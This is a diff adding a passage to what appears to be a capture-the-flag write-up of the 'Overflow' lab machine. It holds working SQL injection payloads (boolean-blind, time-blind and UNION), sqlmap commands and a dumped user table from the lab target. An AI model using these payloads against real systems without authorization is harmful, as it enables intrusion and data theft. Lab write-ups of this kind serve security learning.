@@ -273,4 +273,84 @@ This panel leads to `http://10.10.11.119/admin_cms_panel/admin/login.php`, which
 
 ![cms](https://i.imgur.com/Jj39k1v.png)
 
-We will need to figure the admin login for the CMS, even though we have admin access to the main page already.
+We will need to figure the admin login for the CMS, even though we have admin access to the main page already. The Logs link leads to `http://10.10.11.119/home/index.php#popup1`, which creates a popup.
+
+![undefined](https://i.imgur.com/MnoBr3v.png)
+
+Finally able to preview, there is one thing that appears very different with admin access: `http://overflow.htb/home/logs.php?name=admin`
+
+![overflow](https://i.imgur.com/G8PIHrf.png)
+
+It fails as we do not have the domain for this, so we instead add it to /etc/hosts. Next I switch over to this page and access the data returned.
+
+```
+HTTP/1.1 200 OK
+Date: Tue, 28 Sep 2021 17:21:32 GMT
+Server: Apache/2.4.29 (Ubuntu)
+Vary: Accept-Encoding
+Content-Length: 235
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+<div id='last'>Last login : 10:00:00</div><br> <div id='last'>Last login : 11:00:00</div><br> <div id='last'>Last login : 12:00:00</div><br> <div id='last'>Last login : 14:00:00</div><br> <div id='last'>Last login : 16:00:00</div><br>
+```
+
+Or by clicking on 'Logs'.
+
+![logsadmin](https://i.imgur.com/wtZAGOg.png)
+
+We can play around with Burp Reaper and hopefully figure out more. When we use `admin'` a 500 Internal Server Error is returned. This response is a great sign ofor a potential SQL injection. 
+
+```
+ratcode404@kali$ sqlmap -r logs.php.request
+...[snip]...
+[13:49:55] [INFO] GET parameter 'name' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+GET parameter 'name' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
+sqlmap identified the following injection point(s) with a total of 67 HTTP(s) requests:
+---
+Parameter: name (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: name=admin') AND 1081=1081 AND ('fFTi'='fFTi
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind (query SLEEP)
+    Payload: name=admin') OR (SELECT 8283 FROM (SELECT(SLEEP(5)))Uyda) AND ('jpVt'='jpVt
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: name=admin') UNION ALL SELECT NULL,NULL,CONCAT(0x717a6b7171,0x42676d6d686b6b5452657553507950506a6f6e62636662536d796450626944475270784f62646e4a,0x71717a7071)-- -
+---
+[13:51:32] [INFO] the back-end DBMS is MySQL
+[13:51:32] [CRITICAL] unable to connect to the target URL ('Broken pipe'). sqlmap is going to retry the request(s)
+web server operating system: Linux Ubuntu 18.04 (bionic)
+web application technology: Apache 2.4.29
+back-end DBMS: MySQL >= 5.0.12
+...[snip]...
+```
+
+`sqlmap -r logs.php.request -D logs --tables` displays one table, called userlog.  
+`sqlmap -r logs.php.request -D logs -T userlog --dump` shows all the logins. 
+
+```
+Database: logs
+Table: userlog
+[12 entries]
++----+----------+-----------+
+| id | USERNAME | Lastlogin |
++----+----------+-----------+
+| 1  | admin    | 11:00:00  |
+| 2  | editor   | 10:00:00  |
+| 3  | Mark     | 13:00:00  |
+| 4  | Diana    | 15:00:00  |
+| 5  | Tester   | 16:00:00  |
+| 6  | super    | 20:00:00  |
+| 7  | frost    | 08:00:00  |
+| 8  | Corp     | 10:00:00  |
+| 9  | admin    | 14:00:00  |
+| 10 | admin    | 16:00:00  |
+| 11 | admin    | 10:00:00  |
+| 12 | admin    | 12:00:00  |
++----+----------+-----------+
+```
+
